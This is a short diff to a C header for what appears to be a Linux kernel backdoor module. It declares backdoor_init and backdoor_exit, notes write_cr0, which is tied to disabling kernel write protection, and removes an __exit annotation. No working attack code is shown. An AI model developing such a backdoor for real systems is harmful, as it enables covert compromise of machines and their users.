@@ -12,6 +12,6 @@
 #include <asm/paravirt.h> // write_cr0
 
 int __init backdoor_init(void);
-void __exit backdoor_exit(void);
+void backdoor_exit(void);
 
 #endif
